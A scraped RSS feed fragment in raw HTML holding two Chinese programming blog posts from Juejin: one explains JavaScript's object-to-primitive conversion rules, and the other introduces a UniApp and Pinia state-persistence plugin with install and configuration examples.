            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1643143620204234/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我的写法有点潮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:56:31.000Z" title="Thu Jan 08 2026 07:56:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 对象转基本类型的隐式规则，一次讲清</h2>
<p>在 JavaScript 中，我们经常会遇到一些**“看起来不合理，但实际上完全符合规范”**的行为，比如：</p>
<pre><code class="hljs language-ini" lang="ini">{} + 1
<span class="hljs-section">[]</span> == 0
<span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>这些现象的背后，都绕不开一个核心机制：</p>
<blockquote>
<p><strong>对象在参与运算或比较时，必须先被转换为基本类型值（Primitive）</strong></p>
</blockquote>
<p>而这个转换过程，并不是随意的。</p>
<hr/>
<h3 data-id="heading-1">一、对象如何被转换成基本类型？</h3>
<p>当 JavaScript 需要把一个对象转换成基本类型时，会按<strong>固定顺序</strong>尝试调用对象上的三个方法：</p>
<ol>
<li><code>@@toPrimitive</code>（也就是 <code>Symbol.toPrimitive</code>）</li>
<li><code>valueOf</code></li>
<li><code>toString</code></li>
</ol>
<h4 data-id="heading-2">基本流程可以总结为：</h4>
<blockquote>
<p><strong>谁先返回“基本类型”，谁就胜出</strong></p>
</blockquote>
<p>如果某个方法返回的不是基本类型（string / number / boolean / symbol / bigint / null / undefined），<br/>
那么 JS 会<strong>忽略这个结果，继续尝试下一个方法</strong>。</p>
<hr/>
<h3 data-id="heading-3">二、完整的转换步骤（规范级）</h3>
<p>当对象需要被转换为基本类型时，JavaScript 会按以下逻辑执行：</p>
<ol>
<li>
<p><strong>如果对象存在 <code>Symbol.toPrimitive</code> 方法</strong></p>
<ul>
<li>调用它</li>
<li>如果返回的是基本类型，直接使用</li>
<li>否则抛出 <code>TypeError</code></li>
</ul>
</li>
<li>
<p><strong>否则，根据目标类型（PreferredType）决定调用顺序</strong></p>
<ul>
<li>先尝试 <code>valueOf</code></li>
<li>如果不是基本类型，再尝试 <code>toString</code></li>
</ul>
</li>
<li>
<p><strong>如果都没返回基本类型</strong></p>
<ul>
<li>抛出 <code>TypeError</code></li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-4">三、PreferredType 是什么？</h3>
<p>PreferredType 可以理解为：</p>
<blockquote>
<p><strong>“当前上下文更希望得到什么类型的值”</strong></p>
</blockquote>
<p>它直接影响 <code>valueOf</code> 和 <code>toString</code> 的优先级。</p>
<h4 data-id="heading-5">不同场景下的 PreferredType</h4>

























<table><thead><tr><th>场景</th><th>PreferredType</th><th>优先顺序</th></tr></thead><tbody><tr><td>数学运算（<code>+ - * /</code>）</td><td>Number</td><td>valueOf → toString</td></tr><tr><td>显式字符串转换</td><td>String</td><td>toString → valueOf</td></tr><tr><td><code>==</code> 比较</td><td>Default</td><td>valueOf → toString</td></tr></tbody></table>
<p>📌 <strong>注意</strong>：Default 并不等于 String，大多数情况下它更偏向 Number。</p>
<hr/>
<h3 data-id="heading-6">四、一个可控顺序的示例</h3>
<p>来看一个典型例子：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>

<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]() {
    <span class="hljs-keyword">return</span> i++
  }
}
</code></pre>
<h4 data-id="heading-7">场景 1：隐式数值转换</h4>
<pre><code class="hljs">obj + 1
</code></pre>
<p>执行顺序：</p>
<ol>
<li>调用 <code>Symbol.toPrimitive</code></li>
<li>返回 <code>0</code></li>
<li>表达式变成 <code>0 + 1</code></li>
</ol>
<p>结果是：</p>
<pre><code class="hljs">1
</code></pre>
<hr/>
<h4 data-id="heading-8">场景 2：删除 <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">delete</span> obj[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]
obj + <span class="hljs-number">1</span>
</code></pre>
<p>PreferredType 是 <code>Number</code>，于是：</p>
<ol>
<li>调用 <code>valueOf</code> → 返回 <code>0</code></li>
<li>不再调用 <code>toString</code></li>
</ol>
<hr/>
<h4 data-id="heading-9">场景 3：字符串上下文</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">String</span>(obj)
</code></pre>
<p>PreferredType 是 <code>String</code>：</p>
<ol>
<li>先调用 <code>toString</code></li>
<li>不关心 <code>valueOf</code></li>
</ol>
<hr/>
<h3 data-id="heading-10">五、对象比较时发生了什么？</h3>
<p>当使用 <code>==</code> 进行比较时，如果两个操作数类型不同，JS 会尝试进行<strong>类型对齐</strong>。</p>
<h4 data-id="heading-11">核心规则之一：</h4>
<blockquote>
<p><strong>对象在参与 <code>==</code> 比较时，一定会先被转换为基本类型</strong></p>
</blockquote>
<p>例如：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>实际发生的是：</p>
<ol>
<li><code>obj</code> → 触发对象转基本类型</li>
<li>得到一个 primitive</li>
<li>再与 <code>1</code> 做比较</li>
</ol>
<p>📌 所以很多“奇怪的相等结果”，本质都是<strong>隐式类型转换的副作用</strong>。</p>
<hr/>
<h3 data-id="heading-12">六、为什么设计成这样？</h3>
<p>这套规则的目标只有一个：</p>
<blockquote>
<p><strong>让对象在“必须参与运算”的场景下，有机会表达自己的值语义</strong></p>
</blockquote>
<p>例如：</p>
<ul>
<li><code>Date</code> 更偏向字符串</li>
<li><code>Number</code> 包装对象更偏向数值</li>
<li>自定义对象可以通过 <code>Symbol.toPrimitive</code> 精准控制行为</li>
</ul>
<p>这也是为什么：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() + <span class="hljs-number">1</span>
</code></pre>
<p>表现得更像字符串拼接，而不是数学运算。</p>
<hr/>
<h3 data-id="heading-13">七、实践建议（非常重要）</h3>
<h4 data-id="heading-14">✅ 能不用隐式转换，就不用</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Number</span>(obj)
<span class="hljs-built_in">String</span>(obj)
</code></pre>
<h4 data-id="heading-15">✅ 自定义对象时，优先实现 <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Symbol.toPrimitive]</span>(hint) {
  return <span class="hljs-attr">hint</span> === <span class="hljs-string">'string'</span> ? <span class="hljs-string">'xxx'</span> : <span class="hljs-number">123</span>
}
</code></pre>
<h4 data-id="heading-16">❌ 不要依赖 <code>valueOf / toString</code> 的“调用顺序副作用”</h4>
<p>那是给规范和引擎用的，不是给业务逻辑用的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp + Pinia 数据持久化]]></title>    <link>https://juejin.cn/post/7592555965792911366</link>    <guid>https://juejin.cn/post/7592555965792911366</guid>    <pubDate>2026-01-08T07:58:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592555965792911366" data-draft-id="7592789801708322857" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp + Pinia 数据持久化"/> <meta itemprop="keywords" content="前端,uni-app,数据库"/> <meta itemprop="datePublished" content="2026-01-08T07:58:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一壶纱"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp + Pinia 数据持久化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一壶纱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:58:25.000Z" title="Thu Jan 08 2026 07:58:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">UniApp + Pinia 数据持久化：一个高性能的读写分离方案</h2>
<p>在 UniApp 开发中，使用 <strong>Pinia</strong> 进行状态管理已经非常普及。随着 App 复杂度增加，我们经常需要把一些关键数据（如 Token、用户信息、设置项）存储在本地，以便下次打开 App 时能直接恢复。</p>
<p>但是，在 UniApp（特别是小程序）环境下做持久化，往往会遇到几个棘手的问题：</p>
<ul>
<li><strong>启动体验差</strong>：如果异步读取数据，App 启动时界面会先显示“初始值”（比如空白或未登录状态），过几百毫秒后才闪变为“真实数据”。</li>
<li><strong>操作卡顿</strong>：如果在主线程同步写入大量数据，用户滑动页面时可能会感觉到掉帧。</li>
<li><strong>数据类型限制</strong>：<code>JSON.stringify</code> 原生不支持 <code>Date</code>、<code>BigInt</code> 等类型，存进去取出来还得手动转换。</li>
</ul>
<p>为了解决这些问题，我开发了一个轻量级的插件：<code>pinia-plugin-uni-persist-next</code>。它专注于解决 UniApp 环境下的特殊场景，提供更流畅的开发体验。</p>
<hr/>
<h3 data-id="heading-1">🌟 核心特性</h3>
<p>这个插件的设计思路主要围绕着 <strong>“性能”</strong> 和 <strong>“易用性”</strong> 展开：</p>
<ol>
<li>
<p><strong>⚡ 读写分离策略</strong></p>
<ul>
<li><strong>初始恢复（同步读）</strong>：插件使用 <code>uni.getStorageSync</code> 同步读取数据。这保证了在组件挂载前，Store 的状态已经是最终结果，<strong>避免了界面闪烁</strong>。</li>
<li><strong>状态保存（异步写）</strong>：当状态发生变化时，插件默认使用 <code>uni.setStorage</code> 异步保存，并利用 <code>post</code> 模式延迟执行，<strong>避免频繁 IO 阻塞主线程</strong>。</li>
</ul>
</li>
<li>
<p><strong>🛡️ 增强的序列化支持</strong></p>
<ul>
<li>开发中难免会用到特殊类型。本插件内置了自定义序列化方法，支持以下类型的自动转换：
<ul>
<li><strong>Date</strong>：自动还原为日期对象。</li>
<li><strong>BigInt</strong>：自动转存，不报错。</li>
<li><strong>循环引用</strong>：能安全处理对象间的循环引用，防止程序崩溃。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>⚖️ 存储体积监测</strong></p>
<ul>
<li>考虑到小程序单条缓存通常限制为 1MB，插件会在非生产环境下监测存储大小。如果单条数据超过 <strong>3.5MB</strong>，会在控制台输出警告，帮助开发者及早发现隐患。</li>
</ul>
</li>
<li>
<p><strong>🧩 灵活配置</strong></p>
<ul>
<li>支持按需持久化（<code>paths</code> 过滤）。</li>
<li>支持自定义存储 Key 和前缀。</li>
<li>支持 TypeScript 类型提示。</li>
</ul>
</li>
</ol>
<hr/>
<hr/>
<h3 data-id="heading-2">📦 安装</h3>
<p>推荐使用 pnpm：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add pinia-plugin-uni-persist-next
</code></pre>
<p>或者 yarn/npm：</p>
<pre><code class="hljs language-bash" lang="bash">yarn add pinia-plugin-uni-persist-next
<span class="hljs-comment"># npm install pinia-plugin-uni-persist-next</span>
</code></pre>
<hr/>
<h3 data-id="heading-3">🛠️ 快速上手</h3>
<h4 data-id="heading-4">1. 注册插件</h4>
<p>在你的 <code>main.ts</code> 或 <code>index.ts</code> 中引入并安装插件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createSSRApp } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;
<span class="hljs-keyword">import</span> { createUniPersistPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia-plugin-uni-persist-next"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./App.vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);
  <span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>();

  <span class="hljs-comment">// 1. 创建插件实例</span>
  <span class="hljs-keyword">const</span> uniPersist = <span class="hljs-title function_">createUniPersistPlugin</span>({
    <span class="hljs-attr">keyPrefix</span>: <span class="hljs-string">"my_app_"</span>, <span class="hljs-comment">// 可选：给所有 key 加上统一前缀</span>
  });

  <span class="hljs-comment">// 1. 注册到 pinia</span>
  pinia.<span class="hljs-title function_">use</span>(uniPersist);

  app.<span class="hljs-title function_">use</span>(pinia);
  <span class="hljs-keyword">return</span> { app, <span class="hljs-title class_">Pinia</span>: pinia };
}
</code></pre>
<h4 data-id="heading-5">2. 在 Store 中开启</h4>
<p>就像按开关一样简单，在 Store 里加这几行代码就行：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"user"</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">token</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">userInfo</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"海绵宝宝"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">10</span> },
    <span class="hljs-attr">loginTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(), <span class="hljs-comment">// 直接存 Date 类型！</span>
  }),
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">setToken</span>(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = token;
    },
  },
  <span class="hljs-comment">// ✨ 此处开启持久化</span>
  <span class="hljs-attr">persist</span>: {
    <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  },
});
</code></pre>
<p>搞定！现在就算你刷新页面，或者杀掉 App 重启，<code>token</code> 依然在，而且 <code>loginTime</code> 取出来还是 <code>Date</code> 对象，不用你自己转。</p>
<hr/>
<h3 data-id="heading-6">⚙️ 进阶用法（满足你的控制欲）</h3>
<h4 data-id="heading-7">场景一：数据太多，我只想存一部分</h4>
<p>比如 <code>userInfo</code> 很长，我只想存个 <code>token</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>], <span class="hljs-comment">// 指定名单：只存 token</span>
    },
  ],
}
</code></pre>
<h4 data-id="heading-8">场景二：我想换个存储 Key</h4>
<p>默认 Key 是 Store 的 ID（比如上面的 <code>user</code>），怕跟别人的 key 撞车？改它：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">key</span>: <span class="hljs-string">'my_auth_cache'</span>, <span class="hljs-comment">// 最终在 Storage 里就是 "my_auth_cache"</span>
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>],
    },
  ],
}
</code></pre>
<h3 data-id="heading-9">🔍 技术原理（给好奇宝宝）</h3>
<h4 data-id="heading-10">为什么说它“读写分离”体验最好？</h4>
<p>我们看个伪代码对比：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 🔵 启动 APP 时（读）：必须同步！</span>
<span class="hljs-comment">// 如果这里用异步，页面先显示"未登录"，0.1秒后变成"已登录"，用户会看到界面闪烁。</span>
<span class="hljs-comment">// 所以插件强制使用 getStorageSync，保证页面渲染前数据就到位了。</span>
<span class="hljs-keyword">const</span> data = uni.<span class="hljs-title function_">getStorageSync</span>(key);
store.$patch(data);

<span class="hljs-comment">// 🟠 运行时（写）：必须异步！</span>
<span class="hljs-comment">// 比如用户在滑动列表时触发了状态更新，如果这时候同步写磁盘，</span>
<span class="hljs-comment">// JS 线程卡住等待 IO，用户就会感觉滑动“掉帧”卡顿。</span>
<span class="hljs-comment">// 所以插件默认使用 setStorage（异步），并在后台悄悄保存。</span>
store.$subscribe(<span class="hljs-function">() =&gt;</span> {
  uni.<span class="hljs-title function_">setStorage</span>({ key, data });
});
</code></pre>
<h4 data-id="heading-11">为什么它比 JSON.stringify 更强？</h4>
<p>原生的 <code>JSON.stringify</code> 很傻，遇到 <code>Date</code> 变成字符串，遇到 <code>BigInt</code> 报错，遇到循环引用直接崩。</p>
<p>本插件内部封装了一套 <code>safeStringify</code>：</p>
<ul>
<li>遇到 <strong>Date</strong> -&gt; 标记为日期 -&gt; 读取时自动变回 Date</li>
<li>遇到 <strong>BigInt</strong> -&gt; 转字符串存 -&gt; 保证不报错</li>
<li>遇到 <strong>循环引用</strong> -&gt; 自动切断 -&gt; 保证不崩溃</li>
</ul>
<p>这意味着：<strong>你可以放心地把任何数据往 Pinia 里丢，剩下的交给插件。</strong></p>
<hr/>
<h3 data-id="heading-12">📝 总结</h3>
<p><code>pinia-plugin-uni-persist-next</code> 就像是给你的 UniApp 加上了一个<strong>稳固的后勤补给站</strong>。</p>
<ul>
<li>它<strong>很轻</strong>：不占什么包体积。</li>
<li>它<strong>很强</strong>：Date、BigInt、循环引用统统搞定。</li>
<li>它<strong>很滑</strong>：读写分离设计，绝不拖慢 UI 线程。</li>
</ul>
<p>如果你还在为 UniApp 的数据持久化头疼，或者忍受着旧方案的卡顿，不妨试试这个新方案！</p>
<blockquote>
<p><strong>🔗 GitHub 地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHollelihanqi%2Fpinia-plugin-uni-persist-next" target="_blank" title="https://github.com/Hollelihanqi/pinia-plugin-uni-persist-next" ref="nofollow noopener noreferrer">github.com/Hollelihanq…</a><br/>
觉得好用的话，求个 Star ⭐️！你的支持是我更新的动力！</p>
